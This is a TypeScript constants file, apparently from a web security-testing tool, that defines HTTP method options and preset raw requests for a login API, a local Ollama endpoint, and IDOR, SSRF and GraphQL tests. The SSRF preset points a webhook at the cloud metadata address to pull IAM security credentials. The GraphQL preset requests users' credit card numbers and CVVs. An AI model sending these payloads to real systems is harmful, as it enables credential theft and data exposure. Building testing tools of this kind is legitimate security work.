export const METHOD_OPTIONS = [
  { value: 'GET', label: 'GET' },
  { value: 'POST', label: 'POST' },
  { value: 'PUT', label: 'PUT' },
  { value: 'DELETE', label: 'DELETE' },
  { value: 'PATCH', label: 'PATCH' },
  { value: 'HEAD', label: 'HEAD' },
  { value: 'OPTIONS', label: 'OPTIONS' },
];

export const HTTP_PRESET_OPTIONS = [
  { value: 'auth_login', label: 'JSON Login API', badge: 'POST' },
  { value: 'ollama_models', label: 'Local Ollama /v1/models', badge: 'GET' },
  { value: 'idor_transaction', label: 'IDOR / BOLA Endpoint', badge: 'GET' },
  { value: 'ssrf_webhook', label: 'SSRF Cloud Webhook', badge: 'POST' },
  { value: 'graphql_query', label: 'GraphQL Info Leak', badge: 'POST' },
  { value: 'clear', label: '🧹 Clear / Blank Request', badge: 'RESET' },
];

export const BLANK_REQUEST = `GET / HTTP/1.1
Host: localhost
User-Agent: Nexus-Security-Studio/1.0
Accept: */*

`;

export const PRESET_REQUESTS: Record<string, string> = {
  auth_login: `POST /api/v1/auth/login HTTP/1.1
Host: api.target-system.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json
Accept: application/json
Origin: https://app.target-system.com
Referer: https://app.target-system.com/login
X-Forwarded-For: 127.0.0.1
Cookie: session_id=sess_83921049281; auth_token=jwt_eyJh...

{
  "username": "admin@target-system.com",
  "password": "Password123!",
  "rememberMe": true,
  "redirect_url": "https://app.target-system.com/dashboard"
}`,

  ollama_models: `GET /v1/models HTTP/1.1
Host: localhost:11434
Accept: application/json
User-Agent: Nexus-Security-Studio/1.0`,

  idor_transaction: `GET /api/v2/transactions/98231?account_id=ACC-4091&format=json&include_receipts=true HTTP/1.1
Host: bank.acme-financial.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
X-Client-Version: 2.4.0
Cookie: user_lang=en-US`,

  ssrf_webhook: `POST /api/webhooks/test HTTP/1.1
Host: cloud.enterprise-app.io
Content-Type: application/x-www-form-urlencoded
Authorization: ApiKey key_live_9482941094

url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&event_type=user.created&retry_count=3`,

  graphql_query: `POST /graphql HTTP/1.1
Host: api.shop-platform.net
Content-Type: application/json
Authorization: Bearer eyJhbGciOi...

{
  "query": "query GetUserProfile($id: ID!) { user(id: $id) { id email role creditCards { number cvv } } }",
  "variables": {
    "id": "10029"
  }
}`,
};
